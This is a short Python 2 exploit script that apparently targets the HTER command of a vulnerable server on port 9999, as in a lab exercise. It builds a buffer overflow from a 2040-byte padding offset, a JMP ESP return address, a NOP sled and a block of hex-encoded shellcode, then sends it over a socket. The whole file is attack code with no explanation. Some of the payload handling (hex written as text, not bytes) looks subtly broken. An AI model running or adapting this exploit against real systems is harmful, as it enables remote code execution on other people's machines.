import socket
import os
import sys

vuln_command = "HTER A"                   
crash = 2052    
offset = 2040
eip = "05125062"                               # JMP ESP 0x62501205

shellcode = (
"dbd5d97424f4bb19c0e4a75829c9b15331581783c0040341d3"
"06528d3b449d6dbc2917888d6943d9be59078f3211453bc057"
"424c61ddb463724e84e2f08dd9c4c95d2c050d83dd57c6cf70"
"47638548ec3f0bc911f72af8848374da27470d533f84282db4"
"7ec6ac1c4f2702617fda5aa6b80529debab82a25c066bebd62"
"ec18199221feea988e74b4bc1158cfb99a5f1f48d87bbb10ba"
"e29afc6d1afc5ed1be777206b3da1bebfee4db638897e92c22"
"3f42a4ecb8a59f49565820aa7f9f74fa1736f591e7b7200fef"
"1e9b3212e04bf3bc8981fce3aaa9d68c4354d9b328d13fd95e"
"b4e8759de320e2dec1188497039eab2706883bac450c5ab343"
"240b2419a57ed41eece8758c6be8f0ad23bf55033a55483a94"
"4b91dadfcf4e1fe1ce031bc5c0dda441b4b1f21f6274add1dc"
"2e02b888b7687bceb7a40d2e09114851a6f55c2ada65a2e15e"
"854123ab2edca61633df1d544a5c9725a97cd220f53a0f5966"
"af2fce87fa")

payload = ""
payload += vuln_command
payload += "A" * offset
payload += eip
payload += "90" * 10
payload += shellcode
payload += "C" * 10

print "[+] Sending buffer (Size: %d)" % len(payload)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 9999))
print(s.recv(1024))
s.send(payload)
s.close()
